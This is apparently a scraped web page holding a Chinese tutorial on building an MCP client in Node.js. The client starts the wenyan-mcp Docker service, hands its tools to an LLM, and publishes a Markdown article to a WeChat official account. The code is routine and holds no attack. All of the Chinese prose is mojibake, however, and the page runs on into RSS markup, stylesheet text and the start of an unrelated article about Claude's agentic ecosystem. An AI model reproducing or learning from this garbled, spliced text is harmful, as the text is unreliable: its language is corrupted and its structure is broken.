<p>æˆ‘ä»¬æåˆ°ï¼Œæ™ºèƒ½ä½“ä¹‹æ‰€ä»¥æ¯”å•çº¯çš„è¯­è¨€æ¨¡å‹å¼ºå¤§ï¼Œæ˜¯å› ä¸ºå®ƒæ‹¥æœ‰äº†â€œæ‰‹â€å’Œâ€œè„šâ€â€”â€”ä¹Ÿå°±æ˜¯<strong>ä½¿ç”¨å·¥å…·çš„èƒ½åŠ›</strong>ã€‚</p>
<blockquote>
<p>æ™ºèƒ½ä½“ = å¤§è¯­è¨€æ¨¡å‹ï¼ˆå¤§è„‘ï¼‰ + è§„åˆ’ï¼ˆå‰é¢å¶ï¼‰ + å·¥å…·ï¼ˆæ‰‹è„šï¼‰</p>
</blockquote>
<p>ç†è®ºè¯´å¾—å†å¤šï¼Œç»ˆç©¶è¦è½åœ°ã€‚ä»Šå¤©æˆ‘ä»¬å°±æ¥èŠèŠå¦‚ä½•é€šè¿‡ <strong>MCP (Model Context Protocol)</strong> åè®®ï¼ŒçœŸæ­£çš„è®©ä½ çš„æ™ºèƒ½ä½“â€œåŠ¨â€èµ·æ¥ã€‚æˆ‘ä»¬å°†ä»¥ä¸€ä¸ªå®é™…åœºæ™¯ä¸ºä¾‹ï¼š<strong>å†™ä¸€æ®µä»£ç ï¼Œè®©AIè‡ªåŠ¨æŠŠä¸€ç¯‡æ–‡ç« å‘å¸ƒåˆ°å¾®ä¿¡å…¬ä¼—å·ã€‚</strong></p>
<h2 data-id="heading-0">ä»€ä¹ˆæ˜¯ MCPï¼Ÿ</h2>
<p>åœ¨å¼€å§‹å†™ä»£ç ä¹‹å‰ï¼Œå¾—å…ˆè§£å†³ä¸€ä¸ªç—›ç‚¹ã€‚</p>
<p>ä»¥å‰æˆ‘ä»¬è¦è®© GPT è¿æ¥å¤–éƒ¨å·¥å…·ï¼ˆæ¯”å¦‚è¯»å–æ–‡ä»¶ã€æœç´¢ç½‘é¡µã€æ“ä½œæ•°æ®åº“ï¼‰ï¼Œé€šå¸¸éœ€è¦é’ˆå¯¹ä¸åŒçš„ API å†™ä¸€å¤§å †èƒ¶æ°´ä»£ç ã€‚å¦‚æœä½ ç”¨ <code>LangChain</code>ï¼Œä½ å¾—éµå¾ªå®ƒçš„æ¥å£è§„èŒƒï¼›å¦‚æœä½ æ¢ä¸ªæ¡†æ¶ï¼Œå¯èƒ½å…¨å¾—é‡å†™ã€‚</p>
<p><strong>MCP (Model Context Protocol)</strong> å°±æ˜¯ AI æ—¶ä»£çš„ <strong>USB-C æ¥å£</strong>ã€‚å®ƒæ˜¯ç”± Anthropic ç­‰å…¬å¸æ¨åŠ¨çš„ä¸€ä¸ªå¼€æ”¾æ ‡å‡†ã€‚</p>
<ul>
<li><strong>MCP Server</strong>ï¼šæä¾›å·¥å…·ï¼ˆæ¯”å¦‚ï¼šæ–‡ä»¶è¯»å–æœåŠ¡ã€å¾®ä¿¡å‘å¸ƒæœåŠ¡ï¼‰ã€‚</li>
<li><strong>MCP Client</strong>ï¼šä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„æ™ºèƒ½ä½“ï¼ˆè´Ÿè´£è¿æ¥æ¨¡å‹å’ŒæœåŠ¡ç«¯ï¼‰ã€‚</li>
<li><strong>LLM</strong>ï¼šè´Ÿè´£å†³ç­–è°ƒç”¨å“ªä¸ªå·¥å…·ã€‚</li>
</ul>
<p>åªè¦å¤§å®¶éµå¾ªè¿™ä¸ªåè®®ï¼Œä½ çš„æ™ºèƒ½ä½“å°±å¯ä»¥æ— ç¼è¿æ¥ä»»ä½•æ”¯æŒ MCP çš„å·¥å…·ï¼Œè€Œä¸éœ€è¦å…³å¿ƒåº•å±‚çš„å…·ä½“å®ç°ã€‚</p>
<h2 data-id="heading-1">å®æˆ˜ï¼šæ„å»ºå…¬ä¼—å·å‘å¸ƒæ™ºèƒ½ä½“</h2>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬é€šè¿‡ä¸€æ®µ <code>Node.js</code> ä»£ç ï¼Œæ¼”ç¤ºå¦‚ä½•æŠŠä¸€ä¸ªæœ¬åœ° Markdown æ–‡ä»¶ï¼Œé€šè¿‡ MCP æœåŠ¡å‘å¸ƒåˆ°å¾®ä¿¡å…¬ä¼—å·ã€‚</p>
<h3 data-id="heading-2">1. å‡†å¤‡å·¥ä½œ</h3>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬éœ€è¦ä¸‰ä¸ªè§’è‰²çš„é…åˆï¼š</p>
<ol>
<li><strong>å¤§è„‘</strong>ï¼šä¸€ä¸ªæ”¯æŒ Function Calling çš„å¤§æ¨¡å‹ï¼ˆå¦‚ GPT-4o æˆ– DeepSeek ç­‰å…¼å®¹ OpenAI æ ¼å¼çš„æ¨¡å‹ï¼‰ã€‚</li>
<li><strong>å·¥å…·ç®± (MCP Server)</strong>ï¼šè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcaol64%2Fwenyan-mcp" target="_blank" title="https://github.com/caol64/wenyan-mcp" ref="nofollow noopener noreferrer"><code>æ–‡é¢œ MCP</code></a>ï¼Œè¿™æ˜¯ä¸€ä¸ªå°è£…äº†å¾®ä¿¡å…¬ä¼—å·å‘å¸ƒåŠŸèƒ½çš„ MCP æœåŠ¡ï¼Œæˆ‘ä»¬é€šè¿‡ Docker è¿è¡Œå®ƒã€‚</li>
<li><strong>æ™ºèƒ½ä½“ (MCP Client)</strong>ï¼šæˆ‘ä»¬è‡ªå·±å†™çš„è¿™æ®µ JS ä»£ç ã€‚</li>
</ol>
<h3 data-id="heading-3">2. è¿æ¥ MCP æœåŠ¡</h3>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦å»ºç«‹ä¸ MCP Server çš„è¿æ¥ã€‚åœ¨ä»£ç ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡ <code>StdioClientTransport</code> æ¥å¯åŠ¨ä¸€ä¸ª Docker å®¹å™¨ä½œä¸ºæˆ‘ä»¬çš„å·¥å…·æœåŠ¡ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Client</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@modelcontextprotocol/sdk/client/index.js"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">StdioClientTransport</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@modelcontextprotocol/sdk/client/stdio.js"</span>;

<span class="hljs-comment">// ... ç¯å¢ƒå˜é‡æ£€æŸ¥ä»£ç  ...</span>

<span class="hljs-keyword">const</span> pwd = process.<span class="hljs-title function_">cwd</span>();
<span class="hljs-comment">// å»ºç«‹ä¼ è¾“é€šé“ï¼šé€šè¿‡ Docker è¿è¡Œ wenyan-mcp æœåŠ¡</span>
<span class="hljs-keyword">const</span> transport = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StdioClientTransport</span>({
    <span class="hljs-attr">command</span>: <span class="hljs-string">"docker"</span>,
    <span class="hljs-attr">args</span>: [
        <span class="hljs-string">"run"</span>,
        <span class="hljs-string">"--rm"</span>,
        <span class="hljs-string">"-i"</span>,             <span class="hljs-comment">// å¿…é¡»å¼€å¯äº¤äº’æ¨¡å¼ï¼Œä»¥ä¾¿é€šè¿‡ stdio é€šä¿¡</span>
        <span class="hljs-string">"--env-file"</span>, <span class="hljs-string">".env.test"</span>, <span class="hljs-comment">// ä¼ å…¥å…¬ä¼—å·çš„ AppID ç­‰å‡­è¯</span>
        <span class="hljs-string">"-e"</span>, <span class="hljs-string">`HOST_FILE_PATH=<span class="hljs-subst">${pwd}</span>`</span>,
        <span class="hljs-string">"-v"</span>, <span class="hljs-string">`<span class="hljs-subst">${pwd}</span>:/mnt/host-downloads`</span>, <span class="hljs-comment">// æŒ‚è½½ç›®å½•ï¼Œè®©å®¹å™¨èƒ½è¯»å–åˆ°æ–‡ç« </span>
        <span class="hljs-string">"caol64/wenyan-mcp"</span>,
    ],
});

<span class="hljs-keyword">const</span> client = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Client</span>(
    { <span class="hljs-attr">name</span>: <span class="hljs-string">"wenyan-client"</span>, <span class="hljs-attr">version</span>: <span class="hljs-string">"1.0.0"</span> },
    { <span class="hljs-attr">capabilities</span>: {} }
);

<span class="hljs-keyword">await</span> client.<span class="hljs-title function_">connect</span>(transport);
</code></pre>
<p>è¿™æ®µä»£ç å¯¹åº”äº†ä¸Šä¸€ç¯‡æåˆ°çš„**â€œå·¥å…·ä½¿ç”¨â€**çš„å‰æâ€”â€”æ™ºèƒ½ä½“å¾—å…ˆèƒ½æ‹¿å¾—èµ·å·¥å…·ã€‚</p>
<h3 data-id="heading-4">3. è·å–å·¥å…·åˆ—è¡¨</h3>
<p>è¿æ¥æˆåŠŸåï¼Œæ™ºèƒ½ä½“éœ€è¦çŸ¥é“è‡ªå·±æœ‰å“ªäº›å·¥å…·å¯ç”¨ã€‚è¿™å¯¹åº”äº†ç†è®ºç¯‡ä¸­çš„**â€œé—®é¢˜åˆ†ç±»â€**å‡†å¤‡é˜¶æ®µï¼Œåªæœ‰çŸ¥é“æœ‰å“ªäº›å·¥å…·ï¼Œæ¨¡å‹æ‰èƒ½å†³å®šç”¨å“ªä¸ªã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è·å– MCP æœåŠ¡ç«¯æä¾›çš„æ‰€æœ‰å·¥å…·</span>
<span class="hljs-keyword">const</span> mcpResponse = <span class="hljs-keyword">await</span> client.<span class="hljs-title function_">listTools</span>();

<span class="hljs-comment">// å°† MCP çš„å·¥å…·å®šä¹‰è½¬æ¢ä¸º OpenAI å…¼å®¹çš„ Function Calling æ ¼å¼</span>
<span class="hljs-keyword">const</span> openaiTools = mcpResponse.<span class="hljs-property">tools</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">tool</span>) =&gt;</span> ({
    <span class="hljs-attr">type</span>: <span class="hljs-string">"function"</span>,
    <span class="hljs-attr">function</span>: {
        <span class="hljs-attr">name</span>: tool.<span class="hljs-property">name</span>,
        <span class="hljs-attr">description</span>: tool.<span class="hljs-property">description</span>,
        <span class="hljs-attr">parameters</span>: tool.<span class="hljs-property">inputSchema</span>, <span class="hljs-comment">// MCP çš„ schema é€šå¸¸ç›´æ¥å…¼å®¹</span>
    },
}));
</code></pre>
<p>æ­¤æ—¶ï¼Œ<code>openaiTools</code> é‡Œå°±è£…æ»¡äº†è¯¸å¦‚ <code>publish_article</code> ä¹‹ç±»çš„æ–¹æ³•æè¿°ã€‚</p>
<h3 data-id="heading-5">4. æ€è€ƒä¸å†³ç­–</h3>
<p>ç°åœ¨è¿›å…¥æ ¸å¿ƒç¯èŠ‚ã€‚æˆ‘ä»¬å°†æ–‡ç« å†…å®¹å’Œéœ€æ±‚å‘Šè¯‰ LLMï¼Œè®©å®ƒè‡ªå·±åˆ¤æ–­è¯¥åšä»€ä¹ˆã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> llmClient = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OpenAI</span>({ <span class="hljs-attr">apiKey</span>: <span class="hljs-variable constant_">LLM_API_KEY</span>, <span class="hljs-attr">baseURL</span>: <span class="hljs-variable constant_">LLM_BASE_URL</span> });
<span class="hljs-keyword">const</span> content = <span class="hljs-string">"./test/publish.md"</span>; <span class="hljs-comment">// å¾…å‘å¸ƒçš„æ–‡ç« è·¯å¾„</span>

<span class="hljs-comment">// ç”¨æˆ·çš„æŒ‡ä»¤ï¼šæ—¢åŒ…å«äº†ç›®æ ‡ï¼ˆå‘å¸ƒï¼‰ï¼Œä¹ŸåŒ…å«äº†å‚æ•°ï¼ˆä½¿ç”¨ phycat ä¸»é¢˜ï¼‰</span>
<span class="hljs-keyword">const</span> userPrompt = { 
    <span class="hljs-attr">role</span>: <span class="hljs-string">"user"</span>, 
    <span class="hljs-attr">content</span>: <span class="hljs-string">`ä½¿ç”¨phycatä¸»é¢˜å°†è¿™ç¯‡æ–‡ç« å‘å¸ƒåˆ°å¾®ä¿¡å…¬ä¼—å·ï¼š\n\n<span class="hljs-subst">${content}</span>`</span> 
};

<span class="hljs-comment">// ç¬¬ä¸€è½®å¯¹è¯ï¼šè¯¢é—® LLM</span>
<span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> llmClient.<span class="hljs-property">chat</span>.<span class="hljs-property">completions</span>.<span class="hljs-title function_">create</span>({
    <span class="hljs-attr">model</span>: <span class="hljs-variable constant_">LLM_MODEL</span>,
    <span class="hljs-attr">messages</span>: [userPrompt],
    <span class="hljs-attr">tools</span>: openaiTools, <span class="hljs-comment">// æŠŠå·¥å…·ç®±å±•ç¤ºç»™å®ƒ</span>
    <span class="hljs-attr">tool_choice</span>: <span class="hljs-string">"auto"</span>, <span class="hljs-comment">// è®©æ¨¡å‹è‡ªå·±å†³å®šæ˜¯å¦ç”¨å·¥å…·</span>
});
</code></pre>
<p>åœ¨è¿™é‡Œï¼Œæ¨¡å‹ä¼šåˆ†æ <code>userPrompt</code>ã€‚å®ƒå‘ç°ä½ çš„æ„å›¾æ˜¯â€œå‘å¸ƒâ€ï¼Œå¹¶ä¸”å®ƒçœ‹åˆ°äº† <code>openaiTools</code> é‡Œæœ‰ä¸€ä¸ªèƒ½å‘å¸ƒçš„å·¥å…·ï¼Œäºæ˜¯å®ƒä¸ä¼šç›´æ¥å›ç­”â€œå¥½çš„â€ï¼Œè€Œæ˜¯ä¼šè¿”å›ä¸€ä¸ª <code>tool_calls</code> è¯·æ±‚ã€‚</p>
<h3 data-id="heading-6">5. æ‰§è¡Œå·¥å…·ä¸åé¦ˆ</h3>
<p>æ™ºèƒ½ä½“æ•è·åˆ°æ¨¡å‹çš„è°ƒç”¨è¯·æ±‚ï¼ŒçœŸæ­£çš„å»æ‰§è¡Œæ“ä½œï¼Œå¹¶å°†ç»“æœåé¦ˆç»™æ¨¡å‹ã€‚è¿™å°±æ˜¯**â€œä¼˜åŒ–ç­”æ¡ˆâ€**çš„å‰å¥ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> assistantMessage = response.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>].<span class="hljs-property">message</span>;

<span class="hljs-keyword">if</span> (assistantMessage.<span class="hljs-property">tool_calls</span>) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> toolCall <span class="hljs-keyword">of</span> assistantMessage.<span class="hljs-property">tool_calls</span>) {
        <span class="hljs-keyword">const</span> name = toolCall.<span class="hljs-property">function</span>.<span class="hljs-property">name</span>;
        <span class="hljs-keyword">const</span> args = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(toolCall.<span class="hljs-property">function</span>.<span class="hljs-property">arguments</span>);

        <span class="hljs-comment">// å…³é”®æ­¥éª¤ï¼šé€šè¿‡ MCP Client çœŸæ­£çš„è°ƒç”¨ Docker é‡Œçš„æœåŠ¡</span>
        <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> client.<span class="hljs-title function_">callTool</span>({
            <span class="hljs-attr">name</span>: name,
            <span class="hljs-attr">arguments</span>: args,
        });

        <span class="hljs-comment">// è·å–å·¥å…·æ‰§è¡Œç»“æœï¼ˆæ¯”å¦‚ï¼šå‘å¸ƒæˆåŠŸçš„é“¾æ¥ï¼‰</span>
        <span class="hljs-keyword">const</span> toolContent = result.<span class="hljs-property">content</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> item.<span class="hljs-property">text</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">"\n"</span>);
        
        <span class="hljs-comment">// å°†ç»“æœæ‹¼æ¥å›å¯¹è¯å†å²</span>
        <span class="hljs-keyword">const</span> finalMessages = [
            userPrompt,
            assistantMessage,
            {
                <span class="hljs-attr">role</span>: <span class="hljs-string">"tool"</span>,
                <span class="hljs-attr">tool_call_id</span>: toolCall.<span class="hljs-property">id</span>,
                <span class="hljs-attr">content</span>: toolContent,
            },
        ];

        <span class="hljs-comment">// ç¬¬äºŒè½®å¯¹è¯ï¼šè®© LLM æ ¹æ®å·¥å…·æ‰§è¡Œç»“æœç»™ç”¨æˆ·ä¸€ä¸ªæœ€ç»ˆå›å¤</span>
        <span class="hljs-keyword">const</span> finalResponse = <span class="hljs-keyword">await</span> llmClient.<span class="hljs-property">chat</span>.<span class="hljs-property">completions</span>.<span class="hljs-title function_">create</span>({
            <span class="hljs-attr">model</span>: <span class="hljs-variable constant_">LLM_MODEL</span>,
            <span class="hljs-attr">messages</span>: finalMessages,
        });

        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(finalResponse.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>].<span class="hljs-property">message</span>.<span class="hljs-property">content</span>);
    }
}
</code></pre>
<h2 data-id="heading-7">å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ</h2>
<p>è®©æˆ‘ä»¬å›é¡¾ä¸€ä¸‹æ•´ä¸ªæµç¨‹ï¼š</p>
<ol>
<li><strong>User</strong>: "å¸®æˆ‘æŠŠ <code>publish.md</code> å‘åˆ°å…¬ä¼—å·ã€‚"</li>
<li><strong>LLM</strong>: (æ€è€ƒï¼šæˆ‘ä¸èƒ½ç›´æ¥æ“ä½œå¾®ä¿¡ï¼Œä½†æˆ‘æœ‰ä¸€ä¸ªå« <code>publish_article</code> çš„å·¥å…·ã€‚æˆ‘éœ€è¦æå–å‚æ•°ï¼šæ–‡ä»¶è·¯å¾„å’Œä¸»é¢˜ã€‚) -&gt; <strong>å‘å‡ºæŒ‡ä»¤</strong>ã€‚</li>
<li><strong>Agent (JSä»£ç )</strong>: æ”¶åˆ°æŒ‡ä»¤ï¼Œé€šè¿‡ MCP åè®®å‘Šè¯‰ Docker å®¹å™¨é‡Œçš„æœåŠ¡ï¼šâ€œå˜¿ï¼Œè¿è¡Œä¸€ä¸‹è¿™ä¸ªå‡½æ•°â€ã€‚</li>
<li><strong>MCP Server</strong>: æ‰§è¡Œå®é™…çš„ API è°ƒç”¨ï¼Œè½¬æ¢ Markdownï¼Œä¸Šä¼ ç´ æï¼Œä¿å­˜åˆ°è‰ç¨¿ç®±ï¼Œè¿”å›ç»“æœï¼šâ€œå‘å¸ƒæˆåŠŸï¼Œæ–‡ç« é“¾æ¥æ˜¯ xxxâ€ã€‚</li>
<li><strong>LLM</strong>: æ”¶åˆ°ç»“æœï¼Œç»„ç»‡è¯­è¨€ã€‚ -&gt; <strong>æœ€ç»ˆå›å¤</strong>: "æ‚¨çš„æ–‡ç« å·²æˆåŠŸå‘å¸ƒï¼Œä½¿ç”¨äº† phycat ä¸»é¢˜ï¼Œé“¾æ¥å¦‚ä¸‹ï¼šxxxã€‚"</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e418e70b48dc479692143f5fda320500~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Lev6L6555qE6Zi_5LiN:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769069546&amp;x-signature=anCTzNVjdAK9dbI%2FrlfT2Z18Uy4%3D" alt="mcp-workflow" loading="lazy"/></p>
<h2 data-id="heading-8">æ€»ç»“</h2>
<p>é€šè¿‡å¼•å…¥ MCPï¼Œæˆ‘ä»¬æŠŠâ€œæ™ºèƒ½ä½“â€çš„ä»£ç å†™å¾—éå¸¸é€šç”¨ã€‚</p>
<p>æ³¨æ„åˆ°äº†å—ï¼Ÿä¸Šé¢è¿™æ®µä»£ç é‡Œï¼Œ<strong>æ²¡æœ‰ä»»ä½•ä¸€è¡Œæ˜¯å…³äºå¾®ä¿¡ API çš„å…·ä½“å®ç°çš„</strong>ã€‚å¦‚æœä¸åŠ è½½ <code>wenyan-mcp</code>ï¼Œè€Œæ˜¯æ¢æˆä¸€ä¸ª <code>filesystem-mcp</code>ï¼Œè¿™æ®µä»£ç é€»è¾‘å‡ ä¹ä¸ç”¨å˜ï¼Œæ™ºèƒ½ä½“å°±èƒ½æ‹¥æœ‰æ“ä½œæ–‡ä»¶çš„èƒ½åŠ›ã€‚</p>
<p>è¿™å°±æ˜¯ç°ä»£æ™ºèƒ½ä½“æ¶æ„çš„é­…åŠ›ï¼š<strong>å¤§æ¨¡å‹è´Ÿè´£é€»è¾‘ï¼ŒMCP è´Ÿè´£èƒ½åŠ›ï¼Œæ™ºèƒ½ä½“ç¨‹åºè´Ÿè´£è¿æ¥ã€‚</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç†è§£ Claude çš„ Agentic ç”Ÿæ€ï¼šæŠŠé›¶æ•£èƒ½åŠ›ç»„ç»‡æˆå¯æŒç»­çš„å·¥ä½œæµ]]></title>    <link>https://juejin.cn/post/7595393113552961551</link>    <guid>https://juejin.cn/post/7595393113552961551</guid>    <pubDate>2026-01-15T08:58:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595393113552961551" data-draft-id="7595185093833981987" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç†è§£ Claude çš„ Agentic ç”Ÿæ€ï¼šæŠŠé›¶æ•£èƒ½åŠ›ç»„ç»‡æˆå¯æŒç»­çš„å·¥ä½œæµ"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,Claude"/> <meta itemprop="datePublished" content="2026-01-15T08:58:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ™ºè°±å¼€æ”¾å¹³å°"/> <meta itemprop="url" content="https://juejin.cn/user/2056503277400843"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç†è§£ Claude çš„ Agentic ç”Ÿæ€ï¼šæŠŠé›¶æ•£èƒ½åŠ›ç»„ç»‡æˆå¯æŒç»­çš„å·¥ä½œæµ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2056503277400843/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ™ºè°±å¼€æ”¾å¹³å°
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:58:29.000Z" title="Thu Jan 15 2026 08:58:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è‡ªä»æ¨å‡º <strong>Skills</strong> ä»¥æ¥ï¼Œå¾ˆå¤šäººéƒ½æƒ³ææ¸…æ¥šï¼šClaude è¿™å¥— <strong>Agenticï¼ˆæ™ºèƒ½ä½“åŒ–ï¼‰ç”Ÿæ€</strong>é‡Œï¼Œå„ä¸ªç»„ä»¶åˆ°åº•æ˜¯æ€ä¹ˆååŒå·¥ä½œçš„ã€‚</p>
